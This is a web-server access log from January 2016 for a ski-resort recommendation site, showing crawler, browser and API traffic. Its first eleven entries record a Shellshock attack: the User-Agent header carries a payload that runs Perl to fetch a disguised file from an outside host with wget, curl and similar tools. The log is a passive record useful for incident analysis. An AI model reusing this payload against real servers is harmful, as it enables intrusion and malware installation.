189.125.5.246 - - [18/Jan/2016:19:46:18 -0800] "GET /cgi-bin/php4 HTTP/1.1" 404 469 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  \");'"
189.125.5.246 - - [18/Jan/2016:19:46:18 -0800] "GET /cgi-bin/php5 HTTP/1.1" 404 469 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  \");'"
189.125.5.246 - - [18/Jan/2016:19:46:19 -0800] "GET / HTTP/1.1" 200 2578 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  \");'"
189.125.5.246 - - [18/Jan/2016:19:46:19 -0800] "GET /index.cgi HTTP/1.1" 404 467 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  \");'"
189.125.5.246 - - [18/Jan/2016:19:46:20 -0800] "GET /cgi-bin/php HTTP/1.1" 404 468 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  \");'"
189.125.5.246 - - [18/Jan/2016:19:46:20 -0800] "GET /cgi-bin/php5-cli HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  \");'"
189.125.5.246 - - [18/Jan/2016:19:46:20 -0800] "GET /phppath/cgi_wrapper HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  \");'"
189.125.5.246 - - [18/Jan/2016:19:46:21 -0800] "GET /phppath/php HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  \");'"
189.125.5.246 - - [18/Jan/2016:19:46:21 -0800] "GET /cgi-sys/php5 HTTP/1.1" 404 466 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  \");'"
189.125.5.246 - - [18/Jan/2016:19:46:22 -0800] "GET /cgi-bin/php.fcgi HTTP/1.1" 404 471 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  \");'"
189.125.5.246 - - [18/Jan/2016:19:46:22 -0800] "GET /cgi-bin/index.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  \");'"
24.176.178.98 - - [18/Jan/2016:19:51:55 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
52.33.40.213 - - [18/Jan/2016:19:58:39 -0800] "GET /lib/reccapi.php?resort=aspenheights HTTP/1.1" 200 1003 "-" "node-superagent/1.4.0"
52.33.40.213 - - [18/Jan/2016:19:58:59 -0800] "GET /lib/reccapi.php?resort=arapahoebasin HTTP/1.1" 200 1040 "-" "node-superagent/1.4.0"
52.33.40.213 - - [18/Jan/2016:20:00:29 -0800] "GET /lib/reccapi.php?resort=angelfire HTTP/1.1" 200 977 "-" "node-superagent/1.4.0"
108.233.161.48 - - [18/Jan/2016:20:01:06 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
180.76.15.141 - - [18/Jan/2016:20:11:58 -0800] "GET /resorts?resort=snowking HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
107.77.92.128 - - [18/Jan/2016:20:13:13 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1"
50.185.211.161 - - [18/Jan/2016:20:20:36 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPad; CPU OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1"
52.33.40.213 - - [18/Jan/2016:20:22:10 -0800] "GET /lib/reccapi.php?resort=alta HTTP/1.1" 200 1037 "-" "node-superagent/1.4.0"
66.249.64.2 - - [18/Jan/2016:20:34:57 -0800] "GET /lib/reccapi.php?resort=heavenly&date=2016-01-17 HTTP/1.1" 200 1130 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:20:34:58 -0800] "GET /lib/reccapi.php?fields=t&date=2016-01-17&coords=38.92%2C-119.93&size=7&sort=distance HTTP/1.1" 200 1405 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:20:34:58 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=heavenly&dateStart=2016-01-15 HTTP/1.1" 200 877 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
24.24.137.254 - - [18/Jan/2016:20:35:40 -0800] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
24.24.137.254 - - [18/Jan/2016:20:35:41 -0800] "GET /styles/ee08faa9.main.css HTTP/1.1" 200 19446 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
24.24.137.254 - - [18/Jan/2016:20:35:41 -0800] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.1" 200 4903 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
24.24.137.254 - - [18/Jan/2016:20:35:41 -0800] "GET /images/loading.gif HTTP/1.1" 200 13882 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
24.24.137.254 - - [18/Jan/2016:20:35:41 -0800] "GET /images/logo-square-white-sm.png HTTP/1.1" 200 1684 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
24.24.137.254 - - [18/Jan/2016:20:35:41 -0800] "GET /bower_components/requirejs/require.js HTTP/1.1" 200 6701 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
24.24.137.254 - - [18/Jan/2016:20:35:42 -0800] "GET /scripts/fa48e319.main.js HTTP/1.1" 200 123455 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
180.76.15.26 - - [18/Jan/2016:20:35:43 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
24.24.137.254 - - [18/Jan/2016:20:35:43 -0800] "GET /lib/reccapi.php?fields=t HTTP/1.1" 200 1909 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
24.24.137.254 - - [18/Jan/2016:20:35:44 -0800] "GET /images/button.png HTTP/1.1" 200 598 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
24.24.137.254 - - [18/Jan/2016:20:35:44 -0800] "GET /images/greyHeader.png HTTP/1.1" 200 508 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
24.24.137.254 - - [18/Jan/2016:20:35:44 -0800] "GET /images/snowflake5.png HTTP/1.1" 200 2857 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
24.24.137.254 - - [18/Jan/2016:20:35:44 -0800] "GET /images/star5.png HTTP/1.1" 200 1783 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
24.24.137.254 - - [18/Jan/2016:20:35:44 -0800] "GET /images/bluebird5.png HTTP/1.1" 200 2177 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
24.24.137.254 - - [18/Jan/2016:20:35:44 -0800] "GET /images/mtns-icon.png HTTP/1.1" 200 1096 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
24.24.137.254 - - [18/Jan/2016:20:35:44 -0800] "GET /images/shading-icon.png HTTP/1.1" 200 536 "http://whereshouldiski.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mercury/8.0.1 Mobile/10A523 Safari/8536.25"
188.116.183.23 - - [18/Jan/2016:20:35:49 -0800] "GET /index.php HTTP/1.1" 404 532 "-" "Mozilla/5.0 (Windows NT 5.1; rv:22.0) Gecko/20100101 Firefox/22.0 Paros/3.2.13"
180.76.15.155 - - [18/Jan/2016:20:36:43 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.214.217.61 - - [18/Jan/2016:20:41:10 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
69.30.198.202 - - [18/Jan/2016:20:41:38 -0800] "GET /robots.txt HTTP/1.0" 200 338 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
69.30.198.202 - - [18/Jan/2016:20:41:40 -0800] "GET /resorts?resort=mounthoodmeadows HTTP/1.0" 404 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
69.30.198.202 - - [18/Jan/2016:20:41:41 -0800] "GET /resorts?resort=mtrose HTTP/1.0" 404 469 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
69.30.198.202 - - [18/Jan/2016:20:41:43 -0800] "GET /resorts?resort=northstar-at-tahoe HTTP/1.0" 404 469 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
69.30.198.202 - - [18/Jan/2016:20:41:44 -0800] "GET /resorts?resort=redmountain HTTP/1.0" 404 469 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
69.30.198.202 - - [18/Jan/2016:20:41:45 -0800] "GET /viz/2012-2013-viz.php HTTP/1.0" 404 469 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
71.11.183.194 - - [18/Jan/2016:20:47:08 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
172.58.96.210 - - [18/Jan/2016:20:49:53 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPad; CPU OS 7_0_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A501 Safari/9537.53"
220.181.108.116 - - [18/Jan/2016:20:54:39 -0800] "-" 408 0 "-" "-"
66.249.64.2 - - [18/Jan/2016:20:59:04 -0800] "GET /lib/reccapi.php?resort=whistlerblackcomb&date=2016-01-21 HTTP/1.1" 200 969 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:20:59:05 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=whistlerblackcomb&dateStart=2016-01-19 HTTP/1.1" 200 534 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:20:59:06 -0800] "GET /lib/reccapi.php?fields=t&date=2016-01-21&coords=50.1159%2C-122.949&size=7&sort=distance HTTP/1.1" 200 1417 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
73.158.116.250 - - [18/Jan/2016:21:07:01 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"
66.249.64.8 - - [18/Jan/2016:21:07:49 -0800] "GET /lib/reccapi.php?resort=diamondpeak&date=2016-01-17 HTTP/1.1" 200 1071 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:21:07:50 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=diamondpeak&dateStart=2016-01-15 HTTP/1.1" 200 872 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:21:07:50 -0800] "GET /lib/reccapi.php?fields=t&date=2016-01-17&coords=39.254%2C-119.924&size=7&sort=distance HTTP/1.1" 200 1414 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
47.208.176.144 - - [18/Jan/2016:21:08:37 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 304 187 "http://thebackcountry.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
198.204.220.27 - - [18/Jan/2016:21:10:42 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1"
170.75.162.130 - - [18/Jan/2016:21:22:41 -0800] "GET /lib/reccapi.php?resort=heavenly HTTP/1.1" 200 1049 "-" "node-superagent/1.4.0"
68.183.197.136 - - [18/Jan/2016:21:25:13 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:43.0) Gecko/20100101 Firefox/43.0"
47.208.176.144 - - [18/Jan/2016:21:27:09 -0800] "-" 408 0 "-" "-"
47.208.176.144 - - [18/Jan/2016:21:27:09 -0800] "-" 408 0 "-" "-"
66.249.64.2 - - [18/Jan/2016:21:29:12 -0800] "GET /lib/reccapi.php?resort=jacksonhole&date=2016-01-17 HTTP/1.1" 200 1060 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:21:29:13 -0800] "GET /lib/reccapi.php?fields=t&date=2016-01-17&coords=43.61%2C-110.86&size=7&sort=distance HTTP/1.1" 200 1418 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:21:29:13 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=jacksonhole&dateStart=2016-01-15 HTTP/1.1" 200 883 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.161 - - [18/Jan/2016:21:31:33 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.152 - - [18/Jan/2016:21:32:21 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
68.183.197.136 - - [18/Jan/2016:21:34:35 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:43.0) Gecko/20100101 Firefox/43.0"
100.43.91.17 - - [18/Jan/2016:21:37:41 -0800] "GET /robots.txt HTTP/1.1" 200 375 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
141.8.143.217 - - [18/Jan/2016:21:37:42 -0800] "GET /robots.txt HTTP/1.1" 200 375 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
141.8.143.217 - - [18/Jan/2016:21:37:44 -0800] "GET / HTTP/1.1" 200 2614 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
100.43.91.17 - - [18/Jan/2016:21:37:45 -0800] "GET / HTTP/1.1" 200 2614 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
141.8.143.217 - - [18/Jan/2016:21:37:48 -0800] "GET / HTTP/1.1" 200 2614 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
100.43.91.17 - - [18/Jan/2016:21:37:48 -0800] "GET / HTTP/1.1" 200 2614 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
50.242.71.114 - - [18/Jan/2016:21:38:29 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
66.249.64.2 - - [18/Jan/2016:21:41:40 -0800] "GET /lib/reccapi.php?resort=whistlerblackcomb&date=2016-01-17 HTTP/1.1" 200 968 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:21:41:41 -0800] "GET /lib/reccapi.php?fields=t&date=2016-01-17&coords=50.1159%2C-122.949&size=7&sort=distance HTTP/1.1" 200 1416 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:21:41:41 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=whistlerblackcomb&dateStart=2016-01-15 HTTP/1.1" 200 871 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
52.33.40.213 - - [18/Jan/2016:21:46:24 -0800] "GET /lib/reccapi.php?resort=bigsky HTTP/1.1" 200 1088 "-" "node-superagent/1.4.0"
73.223.117.84 - - [18/Jan/2016:21:49:52 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
73.240.12.164 - - [18/Jan/2016:21:56:40 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1"
73.235.201.208 - - [18/Jan/2016:22:00:06 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
170.75.162.130 - - [18/Jan/2016:22:00:47 -0800] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 1043 "-" "node-superagent/1.4.0"
180.76.15.139 - - [18/Jan/2016:22:35:15 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.139 - - [18/Jan/2016:22:36:11 -0800] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.64.127 - - [18/Jan/2016:22:37:06 -0800] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:22:42:52 -0800] "GET /lib/reccapi.php?resort=mountainhigh&date=2016-01-17 HTTP/1.1" 200 1031 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:22:42:54 -0800] "GET /lib/reccapi.php?fields=t&date=2016-01-17&coords=34.38%2C-117.71&size=7&sort=distance HTTP/1.1" 200 1319 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.127 - - [18/Jan/2016:22:42:54 -0800] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=mountainhigh&dateStart=2016-01-15 HTTP/1.1" 200 857 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
75.111.104.122 - - [18/Jan/2016:22:43:01 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1"
170.75.162.130 - - [18/Jan/2016:22:53:34 -0800] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 1039 "-" "node-superagent/1.4.0"
71.202.120.67 - - [18/Jan/2016:22:54:27 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
66.249.64.127 - - [18/Jan/2016:22:55:22 -0800] "GET /lib/reccapi.php?fields=t HTTP/1.1" 200 1910 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
52.33.40.213 - - [18/Jan/2016:22:57:27 -0800] "GET /lib/reccapi.php?resort=cannonmountain HTTP/1.1" 200 1026 "-" "node-superagent/1.4.0"
52.33.40.213 - - [18/Jan/2016:22:57:37 -0800] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 1031 "-" "node-superagent/1.4.0"
107.77.109.64 - - [18/Jan/2016:23:04:04 -0800] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1"
170.75.162.130 - - [18/Jan/2016:23:09:16 -0800] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 1042 "-" "node-superagent/1.4.0"
170.75.162.130 - - [18/Jan/2016:23:09:16 -0800] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 1067 "-" "node-superagent/1.4.0"
